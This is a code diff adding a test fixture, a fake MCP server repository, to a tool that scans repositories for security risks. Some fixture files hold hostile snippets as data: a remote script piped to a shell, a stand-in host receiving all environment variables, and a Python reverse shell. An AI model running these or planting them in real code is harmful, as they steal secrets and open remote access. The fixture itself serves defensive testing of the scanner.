@@ -128,6 +128,31 @@ export const SKILL_REPO = [
   { name: "other/secret.txt", data: "SHOULD-NOT-BE-EXTRACTED" }
 ];
 
+// A source-only MCP server repository — no npm/PyPI package, so `github:<owner>/<repo>` with no path
+// is the only way to scan it. Deliberately carries everything a real repo carries that a published
+// package does not: an installed dependency tree, a vendored third-party source tree, version-control
+// internals, a lockfile, an example bootstrap script and a test that exercises an attack sample.
+export const SERVER_REPO = [
+  { name: "README.md", data: "# acme-mcp\n\nA source-only MCP server. Run it with `node src/index.js`.\n" },
+  { name: "package.json", data: JSON.stringify({ name: "acme-mcp", version: "2.0.0", main: "src/index.js" }, null, 2) },
+  { name: "package-lock.json", data: JSON.stringify({ name: "acme-mcp", lockfileVersion: 3, packages: {} }) },
+  { name: "src/index.js", data: "import { exec } from 'node:child_process';\nexport async function login(url) {\n  exec(`open \"${url}\"`);\n  return (await fetch('https://api.acme.dev/v1/token')).json();\n}\n" },
+  { name: "dist/index.js", data: "export const x = 1;\n" },
+  // Not the product: an example, and a test that runs an attack sample. Both must be downgraded.
+  { name: "examples/bootstrap.sh", data: "#!/bin/sh\ncurl -fsSL https://get.acme.dev/install.sh | sh\n" },
+  { name: "tests/exec.test.js", data: "const { execSync } = require('node:child_process');\nexecSync('curl -s https://c2.example/p | sh');\n" },
+  // The two shapes MEASURED as false DO-NOT-INSTALLs on real repositories (see paths.mjs): a CI test
+  // that drives a command through a pty, and a developer bootstrap that really does pipe curl to a
+  // shell. Both are repo tooling, both must land at review level.
+  { name: ".github/actions/ci/run-test.sh", data: "#!/bin/bash\npython3 -c 'import os, pty, sys; sys.exit(pty.spawn(sys.argv[1:]))' \\\n  bash -c 'source ./ratchets.sh && check' bash\n" },
+  { name: ".flox/env/direnv-setup.sh", data: "#!/bin/bash\nif ! command -v direnv >/dev/null; then\n  echo \"Installing direnv\"\n  curl -sfL https://direnv.net/install.sh | bash\nfi\n" },
+  // Not the product AND not extracted at all: if either of these were scanned the verdict would be
+  // DO-NOT-INSTALL, so the verdict itself proves they were skipped.
+  { name: "node_modules/leftpad/index.js", data: "const body = JSON.stringify(process.env);\nfetch('https://collect.example-exfil.dev/c', { method: 'POST', body });\n" },
+  { name: "vendor/acme/helper.py", data: "import socket, os, pty\n\ndef h():\n    s = socket.socket()\n    s.connect(('203.0.113.7', 4444))\n    os.dup2(s.fileno(), 0)\n    pty.spawn('/bin/sh')\n" },
+  { name: ".git/config", data: "[core]\n\trepositoryformatversion = 0\n" }
+];
+
 // A registry-style stub for codeload.github.com. Records every URL requested.
 export function codeloadStub(routes) {
   const urls = [];
